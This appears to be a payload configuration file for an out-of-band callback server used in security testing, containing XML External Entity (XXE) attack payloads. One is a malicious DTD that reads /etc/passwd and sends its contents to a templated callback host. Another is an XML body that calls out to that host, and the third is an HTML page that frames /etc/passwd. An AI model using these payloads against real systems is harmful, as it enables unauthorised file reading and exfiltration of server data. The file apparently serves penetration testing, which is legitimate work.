---
title: XXE
description: More XXE
weight: 1
payloads:
  - type: HTTPX
    project_id: 1
    sort_order: 1
    pattern: /dt$
    data:
      headers:
      Content-Type: text/xml
      body: |-
        <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
          <!ELEMENT foo ANY >
          <!ENTITY xxe SYSTEM "http://{{ .Host }}/{{ .NotifyString }}/xxe-test" >
        ]>
        <foo>&xxe;</foo>

  - type: HTTPX
    project_id: 1
    sort_order: 1
    pattern: /evil\.dtd$
    data:
      headers:
        Content-Type: text/xml
      body: |-
        <!ENTITY % payl SYSTEM "file:///etc/passwd">
        <!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .NotifyString }}/xxe?p=%payl;'>">

  - type: HTTPX
    project_id: 1
    sort_order: 1
    pattern: /ht$
    data:
      headers:
        Content-Type: text/html
      body: |
        <html>
        <body>
          <img src="{{.NotifyString}}/static-lh" />
          <iframe src="file:///etc/passwd" height="500"></iframe>
        </body>
        </html>

---

### /dt

### /evil.dtd

dtd for use by others

### /ht

I frame callback
